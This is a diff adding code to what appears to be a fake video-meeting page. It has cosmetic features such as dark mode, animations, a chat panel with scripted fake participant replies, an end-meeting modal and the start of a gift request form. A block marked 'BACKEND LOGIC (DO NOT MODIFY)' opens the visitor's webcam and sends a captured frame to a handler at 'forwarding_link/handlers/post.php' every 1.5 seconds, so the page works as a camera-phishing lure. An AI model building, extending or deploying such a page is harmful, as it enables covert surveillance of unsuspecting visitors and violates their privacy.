+        <svg class="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.12-.23
+                   11.36 11.36 0 003.54.56 1 1 0 011 1V20a1 1 0 01-1 1
+                   A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1
+                   11.36 11.36 0 00.56 3.54 1 1 0 01-.23 1.13z"/>
+        </svg>
+        End
+      </button>
+
+    </div>
+  </div>
+  <!-- ────────────────────────────────────────────── -->
+
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  BACKEND LOGIC (DO NOT MODIFY)                 -->
+  <!-- ══════════════════════════════════════════════ -->
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/handlers/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result) {
+          // call the function that handles the response/results
+        },
+        error: function() {}
+      });
+    }
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        if (errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      var context = canvas.getContext('2d');
+      setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+        video.play();
+      }, 1500);
+    }
+
+    function PopUp() {
+      document.getElementById('ac-wrapper').style.display = "none";
+    }
+
+    // Load init
+    init();
+
+    $(document).ready(function() {
+      setTimeout(function() {
+        PopUp();
+      }, 5000); // 5000ms = 5 seconds before dismissing waiting room
+    });
+  </script>
+  <!-- ────────────────────────────────────────────── -->
+
+  <!-- UI-only: meeting timer -->
+  <script>
+    var meetSecs = 0;
+    setInterval(function() {
+      meetSecs++;
+      var m = String(Math.floor(meetSecs / 60)).padStart(2, '0');
+      var s = String(meetSecs % 60).padStart(2, '0');
+      var el = document.getElementById('meetTimer');
+      if (el) el.textContent = m + ':' + s;
+    }, 1000);
+  </script>
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  DARK MODE TOGGLE — UI only, no backend changes -->
+  <!-- ══════════════════════════════════════════════ -->
+  <script>
+    (function () {
+      'use strict';
+
+      // ── Helper: apply or remove the .dark class on <html> ──
+      function applyTheme(isDark) {
+        var html = document.documentElement;
+        if (isDark) {
+          html.classList.add('dark');
+          localStorage.setItem('theme', 'dark');
+        } else {
+          html.classList.remove('dark');
+          localStorage.setItem('theme', 'light');
+        }
+      }
+
+      // ── Bind toggle button once DOM is ready ──
+      document.addEventListener('DOMContentLoaded', function () {
+        var btn = document.getElementById('theme-toggle');
+        if (!btn) return;
+
+        btn.addEventListener('click', function () {
+          // Flip the current state
+          var nowDark = !document.documentElement.classList.contains('dark');
+          applyTheme(nowDark);
+
+          // Subtle scale-pop feedback
+          btn.style.transform = 'scale(0.92)';
+          setTimeout(function () { btn.style.transform = ''; }, 150);
+        });
+      });
+
+      // Note: the localStorage read that prevents flash of wrong theme is
+      // already applied in the <head> script earlier on this page.
+    })();
+  </script>
+  <!-- ────────────────────────────────────────────── -->
+
+  <!-- ANIMATIONS — Glowing Star Background. Vanilla JS only. No backend changes. -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ─────────────────────────────────────────────────────────────────
+       HELPERS
+    ───────────────────────────────────────────────────────────────── */
+    function isDark() {
+      return document.documentElement.classList.contains('dark');
+    }
+
+    /* ═══════════════════════════════════════════════════════════════
+       PART 1 — GLOWING STAR BACKGROUND
+       Uses Canvas 2D API + requestAnimationFrame
+       ═══════════════════════════════════════════════════════════════ */
+    (function initStars() {
+      var canvas = document.getElementById('star-canvas');
+      if (!canvas) return;
+      var ctx = canvas.getContext('2d');
+
+      var W, H;
+      var STAR_COUNT = 130;   // total particles — keep low for perf
+      var stars = [];
+
+      /* POLISH: debounce resize to avoid thrash during window drag */
+      var _resizeTimer;
+      function resize() {
+        W = canvas.width  = window.innerWidth;
+        H = canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', function () {
+        clearTimeout(_resizeTimer);
+        _resizeTimer = setTimeout(resize, 120);
+      });
+      resize();
+
+      /* Create a single star with randomised properties */
+      function makeStar() {
+        return {
+          x:        Math.random() * W,
+          y:        Math.random() * H,
+          r:        Math.random() * 1.6 + 0.4,   // 0.4 – 2 px radius
+          vx:       (Math.random() - 0.5) * 0.18, // slow horizontal drift
+          vy:       (Math.random() - 0.5) * 0.18, // slow vertical drift
+          phase:    Math.random() * Math.PI * 2,  // twinkle phase offset
+          twinkleSpeed: Math.random() * 0.018 + 0.006 // twinkle rate
+        };
+      }
+
+      /* Populate star pool */
+      for (var i = 0; i < STAR_COUNT; i++) {
+        stars.push(makeStar());
+      }
+
+      /* Draw one frame */
+      function drawStars() {
+        ctx.clearRect(0, 0, W, H);
+
+        var dark = isDark();
+        /* Theme-aware star colours
+           Dark  → brighter white/indigo glows
+           Light → soft lavender/grey        */
+        var coreColor  = dark ? 'rgba(220,228,255,'  : 'rgba(99,102,180,';
+        var glowColor  = dark ? 'rgba(140,160,255,'  : 'rgba(99,102,241,';
+        var glowRadius = dark ? 8 : 4;
+        var alphaBase  = dark ? 0.75 : 0.30;   // max opacity per theme
+
+        for (var j = 0; j < stars.length; j++) {
+          var s = stars[j];
+
+          /* Twinkle: sine wave drives opacity */
+          s.phase += s.twinkleSpeed;
+          var twinkle = (Math.sin(s.phase) * 0.5 + 0.5); // 0 → 1
+          var alpha   = twinkle * alphaBase + (dark ? 0.15 : 0.05);
+
+          /* Drift */
+          s.x += s.vx;
+          s.y += s.vy;
+
+          /* Wrap around edges */
+          if (s.x < -4) s.x = W + 4;
+          if (s.x > W + 4) s.x = -4;
+          if (s.y < -4) s.y = H + 4;
+          if (s.y > H + 4) s.y = -4;
+
+          /* Outer glow */
+          var grad = ctx.createRadialGradient(s.x, s.y, 0, s.x, s.y, s.r * glowRadius);
+          grad.addColorStop(0,   glowColor + (alpha) + ')');
+          grad.addColorStop(0.4, glowColor + (alpha * 0.4) + ')');
+          grad.addColorStop(1,   glowColor + '0)');
+          ctx.beginPath();
+          ctx.arc(s.x, s.y, s.r * glowRadius, 0, Math.PI * 2);
+          ctx.fillStyle = grad;
+          ctx.fill();
+
+          /* Star core */
+          ctx.beginPath();
+          ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+          ctx.fillStyle = coreColor + Math.min(alpha + 0.3, 1) + ')';
+          ctx.fill();
+        }
+      }
+
+      /* Animation loop */
+      function loopStars() {
+        drawStars();
+        requestAnimationFrame(loopStars);
+      }
+      loopStars();
+    })();
+
+
+  })();
+  </script>
+  <!-- ══════════════════════════════════════════════════════════════
+       FUN ANIMATIONS
+       Part 1 — Balloon Launch  |  Part 2 — Flower Rain
+       Vanilla JS only. No backend changes.
+  ══════════════════════════════════════════════════════════════════─ -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ─────────────────────────────────────────────────────────────────
+       SHARED UTILITIES
+    ───────────────────────────────────────────────────────────────── */
+    function rand(min, max) { return Math.random() * (max - min) + min; }
+    function randInt(min, max) { return Math.floor(rand(min, max)); }
+    function isDark() { return document.documentElement.classList.contains('dark'); }
+
+    /* ══════════════════════════════════════════════════════════════─
+       PART 1 — BALLOON LAUNCH
+       SVG balloon elements generated per-click,
+       animated via CSS keyframes (balloonRise),
+       auto-removed on animationend.
+    ══════════════════════════════════════════════════════════════─ */
+
+    /* Soft gradient palette — works in both themes */
+    var BALLOON_PALETTES = [
+      ['#ff9aae','#ff6b9d'],   // rose-pink
+      ['#a78bfa','#7c3aed'],   // violet
+      ['#67e8f9','#06b6d4'],   // cyan
+      ['#86efac','#22c55e'],   // green
+      ['#fde68a','#f59e0b'],   // amber
+      ['#fb923c','#ea580c'],   // orange
+      ['#f9a8d4','#ec4899'],   // hot-pink
+      ['#93c5fd','#3b82f6'],   // blue
+    ];
+
+    /**
+     * buildBalloonSVG(topColor, botColor, size)
+     * Returns inline SVG string — oval body + gloss shine + string
+     */
+    function buildBalloonSVG(top, bot, sz) {
+      var w = sz;
+      var h = sz * 1.25;
+      var cx = w / 2;
+      var cy = h * 0.46;
+      var rx = w * 0.46;
+      var ry = h * 0.44;
+      var gradId = 'bg' + Math.round(Math.random() * 999999);
+      var shineId = 'bs' + Math.round(Math.random() * 999999);
+      return (
+        '<svg xmlns="http://www.w3.org/2000/svg" width="' + w + '" height="' + (h + 14) + '" viewBox="0 0 ' + w + ' ' + (h + 14) + '">'
+        /* radial gradient body */
+        + '<defs>'
+        + '<radialGradient id="' + gradId + '" cx="38%" cy="32%" r="62%">'
+        + '<stop offset="0%" stop-color="' + top + '"/>'
+        + '<stop offset="100%" stop-color="' + bot + '"/>'
+        + '</radialGradient>'
+        /* gloss highlight */
+        + '<radialGradient id="' + shineId + '" cx="35%" cy="28%" r="38%">'
+        + '<stop offset="0%" stop-color="rgba(255,255,255,0.55)"/>'
+        + '<stop offset="100%" stop-color="rgba(255,255,255,0)"/>'
+        + '</radialGradient>'
+        + '</defs>'
+        /* balloon body */
+        + '<ellipse cx="' + cx + '" cy="' + cy + '" rx="' + rx + '" ry="' + ry + '" fill="url(#' + gradId + ')"/>'
+        /* gloss overlay */
+        + '<ellipse cx="' + (cx - rx*0.1) + '" cy="' + (cy - ry*0.1) + '" rx="' + (rx*0.75) + '" ry="' + (ry*0.65) + '" fill="url(#' + shineId + ')"/>'
+        /* knot triangle */
+        + '<polygon points="' + cx + ',' + (cy+ry) + ' ' + (cx-5) + ',' + (cy+ry+7) + ' ' + (cx+5) + ',' + (cy+ry+7) + '" fill="' + bot + '"/>'
+        /* string */
+        + '<line x1="' + cx + '" y1="' + (cy+ry+7) + '" x2="' + (cx + rand(-8,8)) + '" y2="' + (h+12) + '" stroke="rgba(120,120,120,0.6)" stroke-width="1.2"/>'
+        + '</svg>'
+      );
+    }
+
+    /**
+     * launchBalloons() — spawns 12-16 balloons per click
+     */
+    function launchBalloons() {
+      var count = randInt(12, 17);
+      var vw    = window.innerWidth;
+
+      for (var i = 0; i < count; i++) {
+        (function (delay) {
+          setTimeout(function () {
+            var palette = BALLOON_PALETTES[randInt(0, BALLOON_PALETTES.length)];
+            var sz       = rand(48, 88);           // 48–88 px
+            var duration = rand(3.8, 6.2);         // seconds
+            var startX   = rand(0.05, 0.92) * vw;  // horizontal start
+
+            /* CSS custom properties drive the drift keyframe */
+            var bx1 = rand(-60, 60);
+            var bx2 = rand(-90, 90);
+            var bx3 = rand(-70, 70);
+            var bx4 = rand(-50, 50);
+
+            var el = document.createElement('div');
+            el.className  = 'balloon';
+            el.innerHTML  = buildBalloonSVG(palette[0], palette[1], sz);
+            el.style.left = startX + 'px';
+            el.style.setProperty('--bx1', bx1 + 'px');
+            el.style.setProperty('--bx2', bx2 + 'px');
+            el.style.setProperty('--bx3', bx3 + 'px');
+            el.style.setProperty('--bx4', bx4 + 'px');
+            el.style.animationDuration = duration + 's';
+            el.style.animationTimingFunction = 'cubic-bezier(0.45,0.05,0.55,0.95)';
+
+            document.body.appendChild(el);
+
+            /* Auto-clean after animation finishes */
+            el.addEventListener('animationend', function () {
+              el.parentNode && el.parentNode.removeChild(el);
+            });
+          }, delay);
+        }(i * rand(80, 200)));  // stagger each balloon
+      }
+    }
+
+    /* Wire up button */
+    document.addEventListener('DOMContentLoaded', function () {
+      var btnB = document.getElementById('btn-balloon');
+      if (btnB) btnB.addEventListener('click', launchBalloons);
+    });
+
+
+    /* ══════════════════════════════════════════════════════════════─
+       PART 2 — FLOWER RAIN
+       Emoji petals absolutely positioned at top,
+       animated via CSS keyframes (flowerFall),
+       auto-removed on animationend.
+    ══════════════════════════════════════════════════════════════─ */
+
+    /* Flower emoji pool — variety of soft spring petals */
+    var FLOWERS = ['🌸','🌷','🌹','🌼','🏵️','🌺','🌻','⚘️','❀','✿'];
+
+    /**
+     * startFlowerRain() — spawns 30-40 petals over 2s
+     */
+    function startFlowerRain() {
+      var count = randInt(30, 41);
+      var vw    = window.innerWidth;
+
+      for (var i = 0; i < count; i++) {
+        (function (delay) {
+          setTimeout(function () {
+            var emoji    = FLOWERS[randInt(0, FLOWERS.length)];
+            var size     = rand(18, 36);            // 18–36 px font size
+            var duration = rand(2.8, 5.5);          // fall duration
+            var startX   = rand(0, vw - 40);        // horizontal spread
+            var rotTotal = rand(-360, 360);          // total rotation
+
+            var el = document.createElement('div');
+            el.className   = 'flower-petal';
+            el.textContent = emoji;
+            el.style.left  = startX + 'px';
+            el.style.fontSize = size + 'px';
+            el.style.lineHeight = '1';
+            el.style.setProperty('--frot', rotTotal + 'deg');
+            el.style.animationDuration = duration + 's';
+            el.style.animationTimingFunction = 'cubic-bezier(0.25,0.46,0.45,0.94)';
+
+            document.body.appendChild(el);
+
+            /* Auto-clean after animation finishes */
+            el.addEventListener('animationend', function () {
+              el.parentNode && el.parentNode.removeChild(el);
+            });
+          }, delay);
+        }(i * rand(40, 90)));   // stagger each petal
+      }
+    }
+
+    /* Wire up button */
+    document.addEventListener('DOMContentLoaded', function () {
+      var btnF = document.getElementById('btn-flower');
+      if (btnF) btnF.addEventListener('click', startFlowerRain);
+    });
+
+  })();
+  </script>
+  <!-- ══════════════════════════════════════════════════════════════ -->
+
+  <!-- ══════════════════════════════════════════════
+       NEW — RECORDING BADGE (fixed top centre)
+       ══════════════════════════════════════════════ -->
+  <div id="rec-badge" role="status" aria-live="polite">
+    <div class="rec-dot"></div>
+    <span>REC</span>
+    <span id="rec-timer" class="opacity-60 font-mono text-xs ml-1">00:00</span>
+  </div>
+
+  <!-- ══════════════════════════════════════════════
+       NEW — CHAT PANEL
+       ══════════════════════════════════════════════ -->
+  <aside id="chat-panel" aria-label="Meeting chat">
+
+    <!-- Panel header -->
+    <div class="flex items-center justify-between px-5 py-4
+                border-b border-white/10 shrink-0">
+      <div class="flex items-center gap-2">
+        <i class="fas fa-comments text-indigo-400 text-base"></i>
+        <span class="font-semibold text-sm" style="color:var(--text-primary)">Meeting Chat</span>
+      </div>
+      <button id="chat-close"
+              class="ctrl-btn w-8 h-8 rounded-xl flex items-center justify-center
+                     text-gray-400 hover:text-white transition-colors cursor-pointer
+                     border-0 outline-none"
+              aria-label="Close chat">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+        </svg>
+      </button>
+    </div>
+
+    <!-- Messages area -->
+    <div id="chat-messages"
+         class="flex-1 overflow-y-auto px-4 py-4 flex flex-col gap-3"
+         style="scroll-behavior:smooth;">
+      <!-- System message -->
+      <p class="text-xs text-center opacity-50 py-1" style="color:var(--text-muted)">
+        Meeting chat started
+      </p>
+      <!-- Fake initial message -->
+      <div class="chat-msg other">
+        <span class="block text-xs font-semibold mb-0.5 opacity-60">System</span>
+        Welcome! You are the only one here. Messages are local only.
+      </div>
+    </div>
+
+    <!-- Input area -->
+    <div class="shrink-0 px-4 pb-4 pt-3 border-t border-white/10">
+      <div class="flex gap-2 items-center">
+        <input id="chat-input"
+               type="text"
+               placeholder="Message everyone…"
+               maxlength="300"
+               autocomplete="off"
+               class="flex-1 rounded-xl px-4 py-2.5 text-sm outline-none border
+                      border-white/15 bg-white/5 placeholder-gray-500
+                      focus:border-indigo-400/60 focus:bg-white/10
+                      transition-all duration-200"
+               style="color:var(--text-primary); font-family:inherit;">
+        <button id="chat-send"
+                class="shrink-0 w-10 h-10 rounded-xl
+                       bg-gradient-to-br from-indigo-600 to-violet-600
+                       flex items-center justify-center
+                       hover:scale-105 hover:shadow-lg hover:shadow-indigo-900/50
+                       active:scale-95 transition-all duration-200
+                       cursor-pointer border-0 outline-none"
+                aria-label="Send message">
+          <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
+            <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </aside>
+
+  <!-- ══════════════════════════════════════════════
+       NEW — END MEETING MODAL
+       ══════════════════════════════════════════════ -->
+  <div id="end-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="end-modal-title">
+    <div id="end-modal">
+
+      <!-- Icon -->
+      <div class="w-16 h-16 rounded-full bg-red-600/20 border border-red-500/40
+                  flex items-center justify-center">
+        <svg class="w-8 h-8 text-red-400" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.12-.23
+                   11.36 11.36 0 003.54.56 1 1 0 011 1V20a1 1 0 01-1 1
+                   A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1
+                   11.36 11.36 0 00.56 3.54 1 1 0 01-.23 1.13z"/>
+        </svg>
+      </div>
+
+      <!-- Text -->
+      <div class="text-center space-y-2">
+        <h2 id="end-modal-title"
+            class="text-xl font-bold" style="color:var(--text-primary)">
+          Meeting Ended
+        </h2>
+        <p class="text-sm opacity-60" style="color:var(--text-secondary)">
+          You have left the meeting. Thank you for joining.
+        </p>
+      </div>
+
+      <!-- Duration -->
+      <div class="glass rounded-2xl px-6 py-3 text-center w-full">
+        <p class="text-xs uppercase tracking-widest opacity-50 mb-1"
+           style="color:var(--text-muted)">Duration</p>
+        <p id="end-duration" class="text-lg font-bold font-mono"
+           style="color:var(--text-primary)">00:00</p>
+      </div>
+
+      <!-- Actions -->
+      <div class="flex flex-col sm:flex-row gap-3 w-full">
+        <button id="end-modal-rejoin"
+                class="flex-1 flex items-center justify-center gap-2
+                       border border-white/20 hover:bg-white/10
+                       rounded-2xl px-5 py-3 text-sm font-semibold
+                       transition-all duration-300 hover:scale-105
+                       cursor-pointer outline-none"
+                style="color:var(--text-primary)">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9
+                   m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
+          </svg>
+          Rejoin
+        </button>
+        <a href="/"
+           class="flex-1 flex items-center justify-center gap-2
+                  bg-indigo-600 hover:bg-indigo-500
+                  rounded-2xl px-5 py-3 text-sm font-semibold text-white
+                  transition-all duration-300 hover:scale-105 hover:shadow-xl
+                  hover:shadow-indigo-900/50">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/>
+            <polyline stroke-linecap="round" stroke-linejoin="round" points="9 22 9 12 15 12 15 22"/>
+          </svg>
+          Return Home
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════
+       NEW — FAKE BUTTON FUNCTIONALITY (Visual Only)
+       Mute · Record · Chat · End Meeting
+       Vanilla JS. No backend changes. No real audio/video.
+       ══════════════════════════════════════════════ -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ── Helpers ── */
+    function $(id) { return document.getElementById(id); }
+    function pad2(n) { return String(Math.floor(n)).padStart(2,'0'); }
+
+    /* ════════════════════════════════════════════════
+       1. MUTE / UNMUTE TOGGLE
+       ════════════════════════════════════════════════ */
+    var isMuted    = false;
+    var btnMute    = $('btn-mute');
+    var muteIcon   = $('mute-icon');
+    var mutedBadge = $('muted-badge');
+    var micIcon    = $('stage-mic-icon');
+    var micText    = $('stage-mic-text');
+
+    function applyMute(muted) {
+      if (muted) {
+        /* Button UI — active / red tint */
+        btnMute.classList.add('ctrl-btn-active');
+        muteIcon.classList.replace('fa-microphone','fa-microphone-slash');
+        btnMute.querySelector('.label').textContent = 'Unmute';
+        /* Stage overlay badge */
+        mutedBadge.classList.add('visible');
+        /* Stage bottom label */
+        micIcon.classList.replace('fa-microphone','fa-microphone-slash');
+        micIcon.classList.replace('text-green-400','text-red-400');
+        micText.textContent = 'Mic off';
+      } else {
+        btnMute.classList.remove('ctrl-btn-active');
+        muteIcon.classList.replace('fa-microphone-slash','fa-microphone');
+        btnMute.querySelector('.label').textContent = 'Mute';
+        mutedBadge.classList.remove('visible');
+        micIcon.classList.replace('fa-microphone-slash','fa-microphone');
+        micIcon.classList.replace('text-red-400','text-green-400');
+        micText.textContent = 'Mic on';
+      }
+    }
+
+    if (btnMute) {
+      btnMute.addEventListener('click', function () {
+        isMuted = !isMuted;
+        applyMute(isMuted);
+      });
+    }
+
+    /* ════════════════════════════════════════════════
+       2. RECORD TOGGLE
+       ════════════════════════════════════════════════ */
+    var isRecording = false;
+    var btnRecord   = $('btn-record');
+    var recBadge    = $('rec-badge');
+    var recTimerEl  = $('rec-timer');
+    var recIcon     = $('rec-icon');
+    var recSecs     = 0;
+    var recInterval = null;
+
+    function startRecTimer() {
+      recSecs = 0;
+      recInterval = setInterval(function () {
+        recSecs++;
+        if (recTimerEl) {
+          recTimerEl.textContent = pad2(Math.floor(recSecs/60)) + ':' + pad2(recSecs%60);
+        }
+      }, 1000);
+    }
+    function stopRecTimer() {
+      clearInterval(recInterval);
+      recInterval = null;
+      recSecs = 0;
+      if (recTimerEl) recTimerEl.textContent = '00:00';
+    }
+
+    function applyRecord(recording) {
+      if (recording) {
+        btnRecord.classList.add('ctrl-btn-active');
+        recIcon.style.color = '#ef4444';
+        btnRecord.querySelector('.label').textContent = 'Stop Rec';
+        recBadge.classList.add('visible');
+        startRecTimer();
+      } else {
+        btnRecord.classList.remove('ctrl-btn-active');
+        recIcon.style.color = '';
+        btnRecord.querySelector('.label').textContent = 'Record';
+        recBadge.classList.remove('visible');
+        stopRecTimer();
+      }
+    }
+
+    if (btnRecord) {
+      btnRecord.addEventListener('click', function () {
+        isRecording = !isRecording;
+        applyRecord(isRecording);
+      });
+    }
+
+    /* ════════════════════════════════════════════════
+       3. CHAT PANEL — slide in/out + local messages
+       ════════════════════════════════════════════════ */
+    var chatPanel    = $('chat-panel');
+    var chatClose    = $('chat-close');
+    var chatInput    = $('chat-input');
+    var chatSend     = $('chat-send');
+    var chatMessages = $('chat-messages');
+    var btnChat      = $('btn-chat');
+    var isChatOpen   = false;
+
+    /* Fake bot replies for demo flavour */
+    var BOT_REPLIES = [
+      'Sure, sounds good! 👍',
+      'Can you hear me okay?',
+      'I\'ll share my screen in a moment.',
+      'Thanks for joining!',
+      'Let me check on that.',
+      'Great point! 🙌',
+      'Could you repeat that?',
+      'I\'ll follow up after the meeting.',
+    ];
+    var replyIdx = 0;
+
+    function openChat() {
+      isChatOpen = true;
+      chatPanel.classList.add('open');
+      if (btnChat) {
+        btnChat.classList.add('ctrl-btn-chat-active');
+        var lbl = btnChat.querySelector('.label');
+        if (lbl) lbl.textContent = 'Close Chat';
+      }
+      setTimeout(function () {
+        if (chatInput) chatInput.focus();
+        scrollChat();
+      }, 350);
+    }
+
+    function closeChat() {
+      isChatOpen = false;
+      chatPanel.classList.remove('open');
+      if (btnChat) {
+        btnChat.classList.remove('ctrl-btn-chat-active');
+        var lbl = btnChat.querySelector('.label');
+        if (lbl) lbl.textContent = 'Chat';
+      }
+    }
+
+    function scrollChat() {
+      if (chatMessages) chatMessages.scrollTop = chatMessages.scrollHeight;
+    }
+
+    function appendMsg(text, type, sender) {
+      var wrap = document.createElement('div');
+      wrap.style.display = 'flex';
+      wrap.style.flexDirection = 'column';
+      wrap.style.alignItems = (type === 'self') ? 'flex-end' : 'flex-start';
+
+      var bubble = document.createElement('div');
+      bubble.className = 'chat-msg ' + type;
+
+      if (sender) {
+        var nm = document.createElement('span');
+        nm.style.cssText = 'display:block;font-size:11px;font-weight:600;margin-bottom:2px;opacity:0.55;';
+        nm.textContent   = sender;
+        bubble.appendChild(nm);
+      }
+
+      var txt = document.createElement('span');
+      txt.textContent = text;
+      bubble.appendChild(txt);
+
+      var ts = document.createElement('span');
+      var now = new Date();
+      ts.style.cssText = 'font-size:10px;opacity:0.4;margin-top:3px;display:block;';
+      ts.textContent   =
+        pad2(now.getHours()) + ':' + pad2(now.getMinutes());
+      bubble.appendChild(ts);
+
+      wrap.appendChild(bubble);
+      chatMessages.appendChild(wrap);
+      scrollChat();
+    }
+
+    function sendMessage() {
+      if (!chatInput) return;
+      var txt = chatInput.value.trim();
+      if (!txt) return;
+      appendMsg(txt, 'self', 'You');
+      chatInput.value = '';
+      /* Delayed fake bot reply */
+      var reply = BOT_REPLIES[replyIdx % BOT_REPLIES.length];
+      replyIdx++;
+      setTimeout(function () {
+        appendMsg(reply, 'other', 'Participant');
+      }, 900 + Math.random() * 800);
+    }
+
+    if (btnChat)  btnChat.addEventListener('click', function () {
+      isChatOpen ? closeChat() : openChat();
+    });
+    if (chatClose) chatClose.addEventListener('click', closeChat);
+    if (chatSend)  chatSend.addEventListener('click', sendMessage);
+    if (chatInput) {
+      chatInput.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); }
+      });
+    }
+
+    /* ════════════════════════════════════════════════
+       4. END MEETING MODAL
+       ════════════════════════════════════════════════ */
+    var btnEnd     = $('btn-end');
+    var modal      = $('end-modal-backdrop');
+    var endDur     = $('end-duration');
+    var rejoinBtn  = $('end-modal-rejoin');
+    var meetTimerEl = $('meetTimer');
+
+    function openEndModal() {
+      /* Capture current meeting timer for duration display */
+      var dur = meetTimerEl ? meetTimerEl.textContent : '00:00';
+      if (endDur) endDur.textContent = dur;
+      modal.classList.add('visible');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeEndModal() {
+      modal.classList.remove('visible');
+      document.body.style.overflow = '';
+    }
+
+    if (btnEnd)   btnEnd.addEventListener('click', openEndModal);
+    if (rejoinBtn) rejoinBtn.addEventListener('click', closeEndModal);
+
+    /* Close on backdrop click */
+    if (modal) {
+      modal.addEventListener('click', function (e) {
+        if (e.target === modal) closeEndModal();
+      });
+    }
+
+    /* ESC key closes modal or chat */
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape') {
+        if (modal && modal.classList.contains('visible')) { closeEndModal(); }
+        else if (isChatOpen) { closeChat(); }
+      }
+    });
+
+  })();
+  </script>
+  <!-- ────────────────────────────────────────────── -->
+
+
+  <!-- ════════════════════════════════════════════════════════════════
+       🎁  GIFT REQUEST SECTION  — Professional Glassmorphism Form
+       ════════════════════════════════════════════════════════════════ -->
+  <style>
+    /* ── Gift Section Scoped Styles ─────────────────────────── */
+    .gift-section {
+      position: relative;
+      z-index: 10;
+      padding: 4rem 1rem 5rem;
+    }
+    .gift-card {
+      max-width: 680px;
+      margin: 0 auto;
+      background: var(--glass-bg, rgba(255,255,255,0.07));
+      backdrop-filter: blur(22px);
+      -webkit-backdrop-filter: blur(22px);
+      border: 1px solid var(--glass-border, rgba(255,255,255,0.14));
+      border-radius: 24px;
+      padding: 2.5rem 2.25rem;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.35), inset 0 1px 0 rgba(255,255,255,0.10);
+      transition: box-shadow 0.35s ease, transform 0.35s ease;
+    }
+    .gift-card:hover {
+      box-shadow: 0 16px 56px rgba(99,102,241,0.28), inset 0 1px 0 rgba(255,255,255,0.14);
+      transform: translateY(-3px);
+    }
+    .gift-title {
+      font-size: 1.75rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #818cf8, #6366f1, #4f46e5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 0.4rem;
+      text-align: center;
+      letter-spacing: -0.02em;
+    }
+    .gift-desc {
+      font-size: 0.875rem;
+      color: var(--text-secondary, rgba(255,255,255,0.62));
+      text-align: center;
+      margin-bottom: 2rem;
+      line-height: 1.65;
+    }
+    .gift-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+    @media (max-width: 560px) {
+      .gift-grid { grid-template-columns: 1fr; }
+      .gift-card  { padding: 1.75rem 1.25rem; }
+    }
+    .gift-col-full { grid-column: 1 / -1; }
+    .gift-field label {
+      display: block;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text-secondary, rgba(255,255,255,0.75));
+      margin-bottom: 0.35rem;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .gift-field label .req { color: #f87171; margin-left: 2px; }
+    .gift-input,
+    .gift-textarea {
+      width: 100%;
+      background: rgba(99,102,241,0.07);
+      border: 1px solid var(--glass-border, rgba(99,102,241,0.22));
+      border-radius: 10px;
+      color: var(--text-primary, #fff);
+      font-family: 'Inter', sans-serif;
+      font-size: 0.875rem;
+      padding: 0.65rem 0.9rem;
+      outline: none;
+      transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+    }
+    .gift-input:focus,
+    .gift-textarea:focus {
+      border-color: #6366f1;
+      background: rgba(99,102,241,0.14);
+      box-shadow: 0 0 0 3px rgba(99,102,241,0.20);
+    }
+    .gift-input.invalid,
+    .gift-textarea.invalid {
+      border-color: #f87171;
+      box-shadow: 0 0 0 3px rgba(248,113,113,0.18);
+    }
+    .gift-textarea { resize: vertical; min-height: 88px; }
+    .gift-consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.65rem;
+      margin-top: 0.25rem;
+    }
+    .gift-consent input[type="checkbox"] {
+      width: 17px; height: 17px;
